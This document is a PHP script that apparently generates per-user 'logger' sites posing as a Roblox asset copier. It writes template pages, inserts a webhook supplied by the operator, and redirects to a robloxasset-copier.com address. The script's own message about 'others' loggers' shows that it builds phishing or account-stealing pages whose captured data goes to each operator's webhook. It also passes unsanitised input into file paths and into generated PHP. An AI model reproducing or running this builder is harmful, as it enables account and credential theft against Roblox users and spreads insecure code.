<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $dir = $_POST['folder'];
    if(!is_dir($dir)){
        mkdir($dir);
    } else {
    	die('Please don\'t try overwriting others\' loggers!');
    }
    fwrite(fopen($dir.'/index.php', "w"), str_replace("{folderhere}", $_POST['folder'], str_replace("{trhook}", $_POST['webhook'], file_get_contents("assetcopiergenfiles/create1.php"))));
    fwrite(fopen($dir.'/index1.php', "w"), file_get_contents("assetcopiergenfiles/index.php"));
    fwrite(fopen($dir.'/send.php', "w"), file_get_contents("assetcopiergenfiles/send.php"));
    header("location: https://robloxasset-copier.com//$dir");
}
?>